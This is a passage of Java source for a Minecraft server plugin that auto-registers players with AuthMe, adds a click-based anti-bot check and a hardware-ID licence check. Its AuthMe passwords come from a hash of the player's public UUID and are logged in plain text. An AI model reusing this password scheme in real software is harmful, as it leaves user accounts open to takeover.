package dpear.gpg;

import com.magmaguy.elitemobs.EliteMobs;
import com.magmaguy.elitemobs.api.EliteMobDeathEvent;
import com.magmaguy.elitemobs.api.EliteMobRemoveEvent;
import com.magmaguy.elitemobs.api.EliteMobSpawnEvent;
import com.viaversion.viaversion.api.Via;
import fr.xephi.authme.api.v3.AuthMeApi;
import net.milkbowl.vault.permission.Permission;
import org.bukkit.Bukkit;
import org.bukkit.Sound;
import org.bukkit.command.*;
import org.bukkit.configuration.file.FileConfiguration;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.player.*;
import org.bukkit.plugin.RegisteredServiceProvider;
import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.event.Listener;
import org.geysermc.cumulus.ModalForm;
import org.geysermc.cumulus.SimpleForm;
import org.geysermc.cumulus.response.ModalFormResponse;
import org.geysermc.cumulus.response.SimpleFormResponse;
import org.geysermc.cumulus.util.FormImage;
import org.geysermc.floodgate.api.FloodgateApi;
import me.clip.placeholderapi.PlaceholderAPI;
import org.jetbrains.annotations.NotNull;

import javax.annotation.ParametersAreNonnullByDefault;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.lang.reflect.Field;
import java.nio.charset.StandardCharsets;
import java.security.MessageDigest;
import java.util.*;


public class main extends JavaPlugin {

    //全局变量
    public static Boolean PassCheck = false;
    public static String PluginVersion = "2.1";
    public static String Developer = "MownSoft666";
    public RegisteredServiceProvider<Permission> rsp = getServer().getServicesManager().getRegistration(Permission.class);
    List <String>HardCommandAlert = getConfig().getStringList("CommandAlert.Hard");
    List <String>SoftCommandAlert = getConfig().getStringList("CommandAlert.Soft");
    double[] Music = {0.890899,
            0.890899,0.890899,0.943874,1.059463, //3345
            1.059463,0.943874,0.890899,0.793701, //5432
            0.707107,0.707107,0.793701,0.890899, //1123
            0.890899,0.793701,0.793701, //322
            0.890899,0.890899,0.943874,1.059463, //3345
            1.059463,0.943874,0.890899,0.793701, //5432
            0.707107,0.707107,0.793701,0.890899, //1123
            0.793701,0.707107,0.707107 //211
    };

    public LocalServer localServer;

    ArrayList <String>SoundPad = new ArrayList<>(
            List.of("q", "a", "w", "s", "e", "d", "f", "t", "g", "y", "h", "j", "i", "k", "o", "l", "p", ";", "'", "]",
                    "z", "x", "c", "n", "m")
    );

    ArrayList <String>SoundPad_High = new ArrayList<>(
            List.of("Q", "A", "W", "S", "E", "D", "F", "T", "G", "Y", "H", "J", "I", "K", "O", "L", "P", ":", "\"", "}",
                    "Z", "X", "C", "N", "M")
    );

    PlaceholderE PAPIE = new  PlaceholderE(this);

    public ArrayList<String> UnCheckPlayers = new ArrayList<String>(List.of("notch"));

    //精英怪
    ArrayList<String> CustomBossesList = (ArrayList<String>) getConfig().getStringList("EliteMobs.CustomBossesList");

    public ArrayList<UUID> CustomBossesUUID = new ArrayList(List.of());
    public ArrayList<String> CustomBossesName = new ArrayList<String>(List.of());

    ArrayList<Command> RegisterAlertCommands = new ArrayList<Command>();

    public IPsearch ipsearch;

    @Override
    public void onEnable() {
        getLogger().info("正在进行预加载");

        PluginVersion = this.getDescription().getVersion();

        //localServer = new LocalServer();

        //saveDefaultConfig();

        if(!getConfig().getString("ConfigVersion", "0").equals(PluginVersion)){
            getLogger().warning("过期的配置文件版本!请将旧版本配置文件迁移至新版本");
            getLogger().warning("这可能导致意料之外的异常");
        };

        //获取机器码
        getLogger().info("正在获取CID");
        String OsName = System.getProperties().getProperty("os.name");

        String ComputerCode = "FAILURE";
        String ComputerCode_SHA = "";


        //如果使用Windows
        if (OsName.startsWith("Windows")){
            getLogger().info("您正在使用Windows");

            try {
                Process process = Runtime.getRuntime().exec(new String[] { "wmic", "cpu", "get", "ProcessorId" });
                process.getOutputStream().close();
                Scanner sc = new Scanner(process.getInputStream());

                ComputerCode = sc.next();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }

        //如果使用Linux
        if (OsName.equals("Linux")){
            getLogger().info("您正在使用Linux/GNU");

            try {
                Process process = Runtime.getRuntime().exec("sudo dmidecode -s system-uuid");
                InputStream in;
                BufferedReader br;
                in = process.getInputStream();
                br = new BufferedReader(new InputStreamReader(in));
                while (in.read() != -1) {
                    ComputerCode = br.readLine();
                }
                br.close();
                in.close();
                process.destroy();
            } catch (Throwable e) {
                e.printStackTrace();
            }
        }

        if (Objects.equals(ComputerCode, "FAILURE")){
            getLogger().warning("CID获取失败");
            getLogger().warning("没有以管理员身份运行或不受支持的操作系统");
            ComputerCode = new Random().toString();
        }

        getLogger().info("正在加密CID");
        try {
            byte[] encrypted = MessageDigest.getInstance("SHA-256").digest(ComputerCode.getBytes(StandardCharsets.UTF_8));
            StringBuilder SHA = new StringBuilder();
            for (byte b : encrypted) {
                SHA.append(String.format("%02x", b));
            }
            ComputerCode_SHA = SHA.toString();
            getLogger().info("您的SCID: " + ComputerCode_SHA);

        }catch (Exception e){
            e.printStackTrace();
        }


        getLogger().info("正在比对SCID-C");
        String ComputerCode_PMD = ComputerCode_SHA + this.getName() + PluginVersion + Developer;
        String ComputerCode_MD = "FAILURE";


        try {
            byte[] encrypted = MessageDigest.getInstance("md5").digest(ComputerCode_PMD.getBytes(StandardCharsets.UTF_8));
            StringBuilder MD = new StringBuilder();
            for (byte b : encrypted) {
                MD.append(String.format("%02x", b));
            }
            ComputerCode_MD = MD.toString();

        }catch (Exception e){
            ComputerCode_MD = "FAILURE";
            e.printStackTrace();
        }

        if (ComputerCode_MD.equals("FAILURE")){
            getLogger().warning("SCID-C获取失败");
            ComputerCode_MD = new Random().toString();
        }
        if(getConfig().getString("SCID-C", "Null").equals(ComputerCode_MD)){
            getLogger().info("SCID-C校验成功");
            PassCheck = true;
        }else{
            getLogger().info("SCID-C校验失败");
        }

        getLogger().info("插件已验证，开始加载");

        //检查有没有PlaceholderAPI
        if(Bukkit.getPluginManager().getPlugin("PlaceholderAPI") == null){
            getLogger().warning("未检测到PlaceholderAPI");
            getLogger().warning("本插件无法在没有PlaceholderAPI的情况下工作");
        }else{
            getLogger().info("已检测到PlaceholderAPI");
            try {
                PAPIE.register();
                PAPIE.EnableSeasonWorlds = getConfig().getStringList("RealisticSeasonsPAPIFix.EnabledWorld");
                getLogger().info("PlaceholderAPI挂钩成功");
            } catch (Exception e) {
                getLogger().warning("PlaceholderAPI挂钩失败");
                getLogger().warning("详细信息: ");
                e.printStackTrace();
            }
        };

        //检查有没有floodgate
        if(Bukkit.getPluginManager().getPlugin("floodgate") == null){
            getLogger().warning("未检测到floodgate");
            getLogger().warning("本插件无法在没有floodgate的情况下工作");
        }else{
            getLogger().info("已检测到floodgate");
        };

        //检查有没有AuthMe
        if(Bukkit.getPluginManager().getPlugin("AuthMe") == null){
            getLogger().warning("未检测到AuthMe相关功能不可用");
        }else{
            getLogger().info("已检测到AuthMe相关功能可用");
        };

        //检查有没有PlugManX
        if(Bukkit.getPluginManager().getPlugin("PlugManX") == null){
            getLogger().warning("未检测到PlugManX相关功能不可用");
        }else{
            getLogger().info("已检测到PlugManX相关功能可用");
        };

        //检查有没有ViaVersion
        if(Bukkit.getPluginManager().getPlugin("ViaVersion") == null){
            getLogger().warning("未检测到ViaVersion相关功能不可用");
        }else{
            getLogger().info("已检测到ViaVersion相关功能可用");
        };

        //检查有没有ProtocolSupport
        if(Bukkit.getPluginManager().getPlugin("ProtocolSupport") == null){
            getLogger().warning("未检测到ProtocolSupport相关功能不可用");
        }else{
            getLogger().info("已检测到ProtocolSupport相关功能可用");
        };

        //检查有没有Vault
        if(Bukkit.getPluginManager().getPlugin("Vault") == null){
            getLogger().warning("未检测到Vault相关功能不可用");
        }else{
            getLogger().info("已检测到Vault相关功能可用");
        };

        if(getConfig().getBoolean("Register.EventListener", false)){
            getServer().getPluginManager().registerEvents(new EventListener(), this);
            getLogger().info("事件监听器注册成功");
        }
        if (Bukkit.getPluginCommand("checkplayerbe") != null) {
            Bukkit.getPluginCommand("checkplayerbe").setExecutor(new Commander_L());
            getLogger().info("注册指令/checkplayerbe成功");
        }
        if (Bukkit.getPluginCommand("regbeplayer") != null) {
            Bukkit.getPluginCommand("regbeplayer").setExecutor(new Commander_R());
            getLogger().info("注册指令/regbeplayer成功");
        }
        if (Bukkit.getPluginCommand("bemenu") != null) {
            Bukkit.getPluginCommand("bemenu").setExecutor(new Commander_M());
            getLogger().info("注册指令/bemenu成功");
        }
        Objects.requireNonNull(Bukkit.getPluginCommand("bemenu")).setTabCompleter(new TabHandler());
        getLogger().info("注册指令/bemenu补全器完成");

        if (getConfig().getBoolean("EnableIPRegion",false)) {
            ipsearch = new IPsearch();
        }

        //加载命令补全
        LoadCommandAlert();
        //LoadCommandAlertTabComplete();

        if (!PassCheck){
            getLogger().info("Fail in checking SCID-C");
            getServer().getPluginManager().disablePlugin(this);
        }else{
            getLogger().info("插件加载完毕！感谢使用");
            getLogger().info("作者D-Pear QQ:1448360624");
            getLogger().info("有问题可以向作者反馈哦~");
        }

    }

    @Override
    public void onDisable(){

        ipsearch.close();

        getLogger().info("注销插件命令");
        UnloadCommandAlert();
        getLogger().info("注销插件命令成功");
    }

    public class EventListener implements Listener {
        @EventHandler
        public void onPlayerJoin(PlayerJoinEvent e) {

            if(!AuthMeApi.getInstance().isRegistered(e.getPlayer().getName())){
                //只检查未注册玩家
                if(!FloodgateApi.getInstance().isFloodgatePlayer(e.getPlayer().getUniqueId())){
                    //跳过基岩版玩家

                    //添加到未通过测试玩家
                    if (!UnCheckPlayers.contains(e.getPlayer().getName())) {
                        UnCheckPlayers.add(e.getPlayer().getName());
                    }

                    //发送验证消息
                    e.getPlayer().sendMessage("");
                    e.getPlayer().sendMessage("");
                    ;
                    int t;
                    //不要点按钮(Red)
                    for (t = 0; t<new Random().nextInt(0,3);t = t + 1) {
                        Bukkit.dispatchCommand(Bukkit.getConsoleSender(),"tellraw "+e.getPlayer().getName()+
                                " [{\"text\":\"> > > [不要点我] < < <\",\"color\":\"red\",\"bold\":true,\"italic\":false,\"underlined\":false,\"strikethrough\":false,\"obfuscated\":false,\"clickEvent\":{\"action\":\"run_command\",\"value\":\"/register "+
                                e.getPlayer().getName().hashCode()+
                                "\"},\"hoverEvent\":{\"action\":\"show_text\",\"value\":\"§d>>点击我被踢出服务器<<\"}}]");
                    }

                    //不要点按钮(Yellow)
                    for (t = 0; t<new Random().nextInt(0,2);t = t + 1) {
                        Bukkit.dispatchCommand(Bukkit.getConsoleSender(),"tellraw "+e.getPlayer().getName()+
                                " [{\"text\":\"> > > [不要点我啦~] < < <\",\"color\":\"yellow\",\"bold\":true,\"italic\":false,\"underlined\":false,\"strikethrough\":false,\"obfuscated\":false,\"clickEvent\":{\"action\":\"run_command\",\"value\":\"/register "+
                                e.getPlayer().getName().hashCode()+
                                "\"},\"hoverEvent\":{\"action\":\"show_text\",\"value\":\"§d>>点击人家被踢出服务器<<\"}}]");
                    }

                    //要点的
                    Bukkit.dispatchCommand(Bukkit.getConsoleSender(),"tellraw "+e.getPlayer().getName()+
                            " [{\"text\":\"> > > [点我完成真人验证] < < <\",\"color\":\"green\",\"bold\":true,\"italic\":false,\"underlined\":false,\"strikethrough\":false,\"obfuscated\":false,\"clickEvent\":{\"action\":\"run_command\",\"value\":\"/register "+
                            e.getPlayer().getName().hashCode() + e.getPlayer().getUniqueId().hashCode() + e.getPlayer().getUniqueId()+
                            "\"},\"hoverEvent\":{\"action\":\"show_text\",\"value\":\"§d>>点击我完成验证<<\"}}]");

                    //不要点按钮(Yellow)
                    for (t = 0; t<new Random().nextInt(0,2);t = t + 1) {
                        Bukkit.dispatchCommand(Bukkit.getConsoleSender(),"tellraw "+e.getPlayer().getName()+
                                " [{\"text\":\"> > > [不要点我啦~] < < <\",\"color\":\"yellow\",\"bold\":true,\"italic\":false,\"underlined\":false,\"strikethrough\":false,\"obfuscated\":false,\"clickEvent\":{\"action\":\"run_command\",\"value\":\"/register "+
                                e.getPlayer().getName().hashCode()+
                                "\"},\"hoverEvent\":{\"action\":\"show_text\",\"value\":\"§d>>点击人家被踢出服务器<<\"}}]");
                    }

                    //不要点按钮
                    for (t = 0; t<new Random().nextInt(0,3);t = t + 1) {
                        Bukkit.dispatchCommand(Bukkit.getConsoleSender(),"tellraw "+e.getPlayer().getName()+
                                " [{\"text\":\"> > > [不要点我] < < <\",\"color\":\"red\",\"bold\":true,\"italic\":false,\"underlined\":false,\"strikethrough\":false,\"obfuscated\":false,\"clickEvent\":{\"action\":\"run_command\",\"value\":\"/register "+
                                e.getPlayer().getName().hashCode()+
                                "\"},\"hoverEvent\":{\"action\":\"show_text\",\"value\":\"§d>>点击我被踢出服务器<<\"}}]");
                    }

                    e.getPlayer().sendMessage("");
                    e.getPlayer().sendMessage("");

                }
            }

            if (getConfig().getString("Command.OnPlayerJoin").equals("Null")) {
                return;
            }
            ;

            ConsoleCommandSender console = Bukkit.getServer().getConsoleSender();
            Bukkit.dispatchCommand(console,
                    getConfig().getString("Command.OnPlayerJoin", "checkplayerbe %PlayerName").
                            replace("%PlayerName", e.getPlayer().getName()).
                            replace("%PlayerUUID", e.getPlayer().getUniqueId().toString()));


        }

        @EventHandler
        public void onPlayerCommand(PlayerCommandPreprocessEvent e) {

            //是否通过验证
            if(UnCheckPlayers.contains(e.getPlayer().getName())){
                e.setCancelled(true);
                if(e.getMessage().startsWith("/register ")){
                    if(e.getMessage().equals("/register " + e.getPlayer().getName().hashCode() + e.getPlayer().getUniqueId().hashCode() + e.getPlayer().getUniqueId())) {
                        //通过
                        UnCheckPlayers.remove(e.getPlayer().getName());
                        e.getPlayer().sendMessage("§a§l已过人机验证，可以注册了");
                        return;
                    }
                    //不对
                    if(e.getMessage().equals("/register " + e.getPlayer().getName().hashCode())) {
                        e.getPlayer().kickPlayer("§c§l都说了不要点人家啦~");
                        return;
                    }
                    e.getPlayer().sendMessage("§c§l请点击上面按钮通过人机验证后注册 §4(看不到消息可以尝试重进服务器)");
                    return;
                }
                e.getPlayer().sendMessage("§c§l请点击上面按钮通过人机验证后使用命令 §4(看不到消息可以尝试重进服务器)");
                return;
            }

            //是否被其他插件取消
            if (e.isCancelled()) {
                return;
            }
            ;

            //解析命令
            String Command = e.getMessage().split(" ")[0].substring(1);

            Integer index = SoftCommandAlert.indexOf(Command);
            if (index == -1) {
                //不匹配的话
                return;
            }
            ;

            //取消事件
            e.setCancelled(true);

            if(!e.getMessage().substring(1).equals(Command)) {
                //有参数的话
                String[] FullCMD = e.getMessage().substring(Command.length() + 2).split(" ");

                //执行
                CommandAlertExecutor(e.getPlayer(), Command,FullCMD);
            }else {
                //没参数的话
                String[] FullCMD = {};

                //执行
                CommandAlertExecutor(e.getPlayer(), Command,FullCMD);
            }




            return;
        }

        @EventHandler
        public void onCommandChangeWorld(PlayerChangedWorldEvent e){
            String version = Bukkit.getMinecraftVersion();

            //设置视距
            e.getPlayer().setViewDistance(
                    getConfig().getInt("ViewDistance."+e.getPlayer().getWorld().getName(),e.getPlayer().getViewDistance())
            );

            //判断版本
            if (Integer.parseInt(version.substring(2, 4)) >= 18) {
                //设置模拟距离
                e.getPlayer().setSimulationDistance(
                        getConfig().getInt("SimulationDistance." + e.getPlayer().getWorld().getName(), e.getPlayer().getSimulationDistance())
                );
            } else {
                //设置假视距
                e.getPlayer().setNoTickViewDistance(
                        getConfig().getInt("NoTickViewDistance." + e.getPlayer().getWorld().getName(), e.getPlayer().getNoTickViewDistance())
                );
            }
        }

        @EventHandler
        public void onChatEvent(PlayerChatEvent e){

            //是否通过验证
            if(UnCheckPlayers.contains(e.getPlayer().getName())){
                e.setCancelled(true);
                e.getPlayer().sendMessage("§c§l请点击上面按钮通过人机验证后发送消息 §4(看不到消息可以尝试重进服务器)");
                return;
            }

            if (e.getMessage().startsWith("切噜～♪切")){
                try {
                    Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "rainbowbc 玩家" + e.getPlayer().getName() + "发送了一条切噜语消息，已自动翻译:"
                            + CheRu.decrypt(e.getMessage()));
                }catch (Exception ignored){}//不会翻译能不能别翻译[doge]
            }

            if (e.getMessage().startsWith("ToCheRu")){
                e.setMessage(CheRu.encrypt(e.getMessage().substring(7)));
                e.getPlayer().sendMessage("已将您的消息转换为切噜语");
            }

        }

        @EventHandler
        public void onEliteMobSpawn(EliteMobSpawnEvent e){

            //检查是不是指定的精英怪
            for (String NowCheck:CustomBossesList) {
                if(e.getEliteMobEntity().getName().endsWith(NowCheck)){

                    //检查是否已经存在
                    if(!CustomBossesUUID.contains(e.getEliteMobEntity().getEliteUUID())) {
                        //不存在
                        CustomBossesUUID.add(e.getEliteMobEntity().getEliteUUID());
                        CustomBossesName.add(e.getEliteMobEntity().getName());
                        getLogger().info("EliteMob:" + e.getEliteMobEntity().getEliteUUID() + " spawn!Add to list");
                        return;
                    }

                }

            }

        }

        @EventHandler
        public void onEliteMobDeath(EliteMobDeathEvent e){

            //检查是不是指定的精英怪
            for (String NowCheck:CustomBossesList) {
                if(e.getEliteEntity().getName().endsWith(NowCheck)){
                    CustomBossesUUID.remove(e.getEliteEntity().getEliteUUID());
                    CustomBossesName.remove(e.getEliteEntity().getName());
                    getLogger().info("EliteMob:" + e.getEliteEntity().getEliteUUID() + " death!Remove from list");
                }

            }
        }

        @EventHandler
        public void onEliteMobRemove(EliteMobRemoveEvent e){

            //检查是不是指定的精英怪
            for (String NowCheck:CustomBossesList) {
                if(e.getEliteMobEntity().getName().endsWith(NowCheck)){
                    CustomBossesUUID.remove(e.getEliteMobEntity().getEliteUUID());
                    CustomBossesName.remove(e.getEliteMobEntity().getName());
                    getLogger().info("EliteMob:" + e.getEliteMobEntity().getEliteUUID() + " removed!Remove from list");
                }

            }
        }

    }

    public class TabHandler implements TabCompleter {

        @ParametersAreNonnullByDefault
        public List<String> onTabComplete(CommandSender sender, Command cmd, String label, String[] args) {
            if (!(sender instanceof Player)) {
                // 控制台注册个鬼
                return null;
            }

            if (args.length == 1){
                //((Player) sender).getPlayer().playSound(((Player) sender).getPlayer().getLocation(),Sound.BLOCK_NOTE_BLOCK_HARP, 1,((float)(args[0].length()+1)/4)%2);

                if (args[0].length() < Music.length) {
                    ((Player) sender).getPlayer().playSound(((Player) sender).getPlayer().getLocation(),
                            Sound.BLOCK_NOTE_BLOCK_HARP, 1F, (float) Music[args[0].length()]);
                }
                return (List.of("gc","open","help","about","reload","version","plreload","authmelogin","listversion","piano","SetDistance","GetDistance","cheru","light","clearEMCB","sudo","ipr"));
            }

            if (args.length == 2){
                if (args[0].equals("piano")) {
                    return (List.of("bass","snare","hat","basedrum","bell","flute","chime","guitar","xylophone","iron_xylophone", "cow_bell","didgeridoo","bit","banjo","pling","harp"));
                }

                if (args[0].equals("SetDistance")) {
                    return (List.of("NoTickViewDistance","ViewDistance","SimulationDistance"));
                }

                if (args[0].equals("GetDistance")) {
                    return (List.of("NoTickViewDistance","ViewDistance","SimulationDistance"));
                }

                if (args[0].equals("light")) {
                    return (List.of("clear","1","2","3","4","5","6","7","8","9","10","11","12","13","14","15"));
                }

                if (args[0].equals("cheru")) {
                    return (List.of("encrypt","decrypt","send"));
                }

                if (args[0].equals("sudo")) {
                    return null;
                }

            }

            if (args.length == 3){
                if (args[0].equals("piano")){
                    if (args[2].length() != 0){

                        int NoteNumber = SoundPad.indexOf(args[2].substring(args[2].length() - 1));
                        Player player = ((Player) sender).getPlayer();

                        String BlockName = "minecraft:sea_lantern";


                        //高音?
                        if (NoteNumber == -1){
                            NoteNumber = SoundPad_High.indexOf(args[2].substring(args[2].length() - 1));

                            if (NoteNumber == -1){
                                //不存在
                                return (List.of("","Last:null","What's the next?"));
                            }else {
                                //高音
                                player.playSound(((Player) sender).getPlayer().getLocation(),
                                        "block.note_block."+args[1]+"_1", 1F, GetNote(NoteNumber));
                                if (player.isOp()) {
                                    if(player.getLevel() == 14514) {
                                        Bukkit.dispatchCommand(player, "summon minecraft:falling_block ~ ~-2 ~1 {BlockState:{Name:\""+BlockName+"\"},Tags:[\"nbs\",\"nbs_1\"],Glowing:1,Time:-120,DropItem:0,Motion:["
                                                + String.valueOf(-((double) (NoteNumber+1)/10)-1.2) + "d,1.5d,1.5d]}");
                                    }
                                }
                                return (List.of("","Last:+" + NoteNumber, "What's the next?"));
                            }
                        }else {
                            //只有一个肯定不可能低音
                            if (args[2].length() > 1) {
                                if (args[2].charAt(args[2].length() - 2) == '/') {
                                    //低音
                                    player.playSound(player.getLocation(),
                                            "block.note_block."+args[1]+"_-1", 1F, GetNote(NoteNumber));
                                    if (player.isOp()) {
                                        if(player.getLevel() == 14514) {
                                            Bukkit.dispatchCommand(player, "summon minecraft:falling_block ~ ~-2 ~1 {BlockState:{Name:\""+BlockName+"\"},Tags:[\"nbs\",\"nbs_1\"],Glowing:1,Time:-120,DropItem:0,Motion:["
                                                    + String.valueOf(-((double) (NoteNumber+1)/10)+3.6) + "d,1.5d,1.5d]}");
                                        }
                                    }
                                    return (List.of("","Last:-" + NoteNumber, "What's the next?"));
                                } else {
                                    //中音
                                    player.playSound(player.getLocation(),
                                            "block.note_block."+args[1], 1F, GetNote(NoteNumber));
                                    if (player.isOp()) {
                                        if(player.getLevel() == 14514) {
                                            Bukkit.dispatchCommand(player, "summon minecraft:falling_block ~ ~-2 ~1 {BlockState:{Name:\""+BlockName+"\"},Tags:[\"nbs\",\"nbs_1\"],Glowing:1,Time:-120,DropItem:0,Motion:["
                                                    + String.valueOf(-((double) (NoteNumber+1)/10)+1.2) + "d,1.5d,1.5d]}");
                                        }
                                    }
                                    return (List.of("","Last:" + NoteNumber, "What's the next?"));

                                }
                            }else {
                                //中音
                                player.playSound(player.getLocation(),
                                        "block.note_block."+args[1], 1F, GetNote(NoteNumber));
                                if (player.isOp()) {
                                    if(player.getLevel() == 14514) {
                                        Bukkit.dispatchCommand(player, "summon minecraft:falling_block ~ ~-2 ~1 {BlockState:{Name:\""+BlockName+"\"},Tags:[\"nbs\",\"nbs_1\"],Glowing:1,Time:-120,DropItem:0,Motion:["
                                                + String.valueOf(-((double) (NoteNumber+1)/10)+1.2) + "d,1.5d,1.5d]}");
                                    }
                                }
                                return (List.of("","Last:" + NoteNumber, "What's the next?"));
                            }
                        }
                    }
                    return (List.of("What's the next?"));
                }

                if (args[0].equals("sudo")) {
                    if(Objects.equals(args[2], "")) {
                        return (List.of("c:"));
                    }
                }
            }

            if (args.length == 4){
                if (args[0].equals("SetDistance")) {
                    return (List.of("2","3","4","5","6","7","8"));
                }

            }

            if (args[0].equals("sudo")) {
                return (List.of(""));
            }

            return null;
        }


    }

    public class Commander_L implements CommandExecutor {
        @Override
        public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
            if (args.length == 0) {
                return false;
            }

            if (args.length > 1) {
                return false;

            }

            Player P = Bukkit.getPlayer(args[0]);

            //获取版本
            String version = Bukkit.getMinecraftVersion();

            //设置视距
            P.setViewDistance(
                    getConfig().getInt("ViewDistance."+P.getWorld().getName(),P.getViewDistance())
            );

            //判断版本
            if (Integer.parseInt(version.substring(2, 4)) >= 18) {
                //设置模拟距离
                P.setSimulationDistance(
                        getConfig().getInt("SimulationDistance." + P.getWorld().getName(), P.getSimulationDistance())
                );
            } else {
                //设置假视距
                P.setNoTickViewDistance(
                        getConfig().getInt("NoTickViewDistance." + P.getWorld().getName(), P.getNoTickViewDistance())
                );
            }

            //判断玩家对象是否有效
            if (P == null){return false;};

            getLogger().info("玩家 " + P.getUniqueId() + " 加入");

            //拉取配置文件等
            String PlayerVersion = GetVersion(P);
            FileConfiguration config = getConfig();

            getLogger().info("玩家 " + P.getName() + " 版本为 " + PlayerVersion);

            if(!config.getBoolean("Version." + PlayerVersion + ".Enable",false)){
                if(config.getBoolean("Version.Other.Enable",false)){
                    PlayerVersion = "Other";
                }else{
                    return true;
                }
            }
                ConsoleCommandSender console = Bukkit.getServer().getConsoleSender();

            //计算密码
                int PASSWD = P.getUniqueId().hashCode();
                String PASSWORD_F = "Meown115141919810-Null" , PASSWORD_S = "";
                PASSWORD_F = PASSWD+"";
                PASSWORD_S = PASSWORD_F.substring(0,8);


                //是否启用AuthMe自动登入
                if (config.getBoolean("Version." + PlayerVersion + ".AutoLogin.AuthMe",false)){
                    AuthMeApi b = AuthMeApi.getInstance();
                    if(!b.isRegistered(P.getName())){

                        //未注册，注册该玩家
                        if (config.getBoolean("Version." + PlayerVersion + ".AutoLogin.AuthMe_CommandRegister",false)){
                            //使用命令注册
                            Bukkit.dispatchCommand(P,
                                    config.getString("Command.Register" , "register %Password %Password").
                                            replace("%PlayerName", P.getName()).
                                            replace("%PlayerUUID", P.getUniqueId().toString()).
                                            replace("%Password", PASSWORD_S));
                        }else{
                            //使用接口注册
                            b.registerPlayer(P.getName(),PASSWORD_S);
                        }

                        //得到要发送的字符串的数组并发送
                        List<String> Message = config.getStringList("Version." + PlayerVersion + ".Message.OnPlayerRegister");
                        for(int i=0 ; i<Message.size() ; i++){
                            P.sendMessage(Message.get(i));
                        };

                        //得到要执行的命令并执行
                        List<String> Commands = config.getStringList("Version." + PlayerVersion + ".Command.OnPlayerRegister");
                        for(int i=0 ; i<Commands.size() ; i++){
                            Bukkit.dispatchCommand(console,
                                    Commands.get(i).
                                            replace("%PlayerName", P.getName()).
                                            replace("%PlayerUUID", P.getUniqueId().toString()).
                                            replace("%Password", PASSWORD_S));
                            return true;
                        };
                    }else{
                        //已注册，登录
                        b.forceLogin(P);
                    }
                }

                //是否启用指令登录
                if (config.getBoolean("Version." + PlayerVersion + ".AutoLogin.Command",false)){
                    Bukkit.dispatchCommand(P,
                            config.getString("Command.Login" , "login %Password").
                                    replace("%PlayerName", P.getName()).
                                    replace("%PlayerUUID", P.getUniqueId().toString()).
                                    replace("%Password", PASSWORD_S)
                    );

                };

                //得到要发送的字符串的数组并发送
                List<String> Message = config.getStringList("Version." + PlayerVersion + ".Message.OnPlayerJoin");
                for(int i=0 ; i<Message.size() ; i++){
                    P.sendMessage(Message.get(i));
                };

                //得到要执行的命令并执行
                List<String> Commands = config.getStringList("Version." + PlayerVersion + ".Command.OnPlayerJoin");
                for(int i=0 ; i<Commands.size() ; i++){
                    Bukkit.dispatchCommand(console,
                            Commands.get(i).
                                    replace("%PlayerName",P.getName()).
                                    replace("%PlayerUUID", P.getUniqueId().toString()).
                                    replace("%Password", PASSWORD_S));
                };


                //判断权限组提供插件是否为null
                if (rsp == null){
                    getLogger().info("Oh no!rsp is null!But we fix it:)");
                    rsp = getServer().getServicesManager().getRegistration(Permission.class);
                }

                //修改权限组
                if (config.getBoolean("Version." + PlayerVersion + ".AutoPermissionGroup.Vault" , false)){
                    String pgoal = config.getString("Version." + PlayerVersion + ".AutoPermissionGroup.Group" , "default");
                    String now = rsp.getProvider().getPlayerGroups(P)[0];
                    if(!now.equals(pgoal)){
                        rsp.getProvider().playerRemoveGroup(P,now);
                        rsp.getProvider().playerAddGroup(P,pgoal);
                        getLogger().info("移除了玩家 " + P.getName() + " 的权限组" + now + "，添加至 " + pgoal);
                    }
                }


            if (!FloodgateApi.getInstance().isFloodgatePlayer(P.getUniqueId())) {
                if (P.getName().charAt(0) == '.') {
                    getLogger().warning("玩家 " + P.getName() + " 使用了非法用户名");

                    //检查时候启动踢出
                    if(getConfig().getBoolean("Actions.AutoKick.Enable")) {
                        P.kickPlayer(getConfig().getString("Actions.AutoKick.KickMessage" , "[Meown]You are NOT a bedrock player!"));
                        getLogger().info("玩家 " + P.getName() + " 已被踢出");
                    };
                }
                ;
            };
            return true;
        }
    }
    public class Commander_R implements CommandExecutor {
                @Override
                public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
                    if (args.length == 0) {
                        return false;
                    }
                    ;
                    if (args.length > 1) {
                        return false;

                    }
                    ;
                    Player P = Bukkit.getPlayer(args[0]);

                    //判断玩家对象是否有效
                    if (P == null){return false;};

                    if (FloodgateApi.getInstance().isFloodgatePlayer(P.getUniqueId())) {
                        getLogger().info("为玩家 " + P.getUniqueId() + " 注册");
                        //计算密码
                        int PASSWD = P.getUniqueId().hashCode();
                        String PASSWORD_F = "Meown115141919810-Null", PASSWORD_S = "";
                        PASSWORD_F = PASSWD + "";
                        PASSWORD_S = PASSWORD_F.substring(0, 8);
                        //输出密码
                        getLogger().info("玩家 " + P.getName() + " 的密码为 " + PASSWORD_S);

                        //获得命令发送实例
                        ConsoleCommandSender console = Bukkit.getServer().getConsoleSender();

                        //读取配置
                        FileConfiguration config = getConfig();

                        //以玩家身份注册[废弃]
                        //Bukkit.dispatchCommand(PCS, "register " + PASSWORD_S + " " + PASSWORD_S);

                        //得到要发送的字符串的数组并发送
                        List<String> Message = config.getStringList("Message.OnBedrockPlayerRegister");
                        for(int i=0 ; i<Message.size() ; i++){
                            P.sendMessage(Message.get(i));
                        };

                        //得到要执行的命令并执行
                        List<String> Commands = config.getStringList("Command.OnBedrockPlayerRegister");
                        for(int i=0 ; i<Commands.size() ; i++){
                            Bukkit.dispatchCommand(console,
                                    Commands.get(i).
                                            replace("%PlayerName", P.getName()).
                                            replace("%PlayerUUID", P.getUniqueId().toString()).
                                            replace("%Password", PASSWORD_S));
                        };


                        return true;
                    }
                    return false;
        }
    }
    public class Commander_M implements CommandExecutor {
        @Override
        public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {

            //判断参数数量
            if (args.length == 0) {
                sender.sendMessage("参数数量错误");
                return false;
            };

            //判断是否是重载
            if (args[0].equals("reload")){

                //判断权限
                if (sender.hasPermission("dpear.gpg.reload")) {
                }else {
                    sender.sendMessage("权限不足，您没有dpear.gpg.reload权限");
                    return false;
                };

                sender.sendMessage("重载配置文件中...");
                getLogger().info("重载配置文件中...");

//                //清除指令转接
//                getLogger().info("清除指令转接补全");
//                if (getCommand("PearAliases") == null){
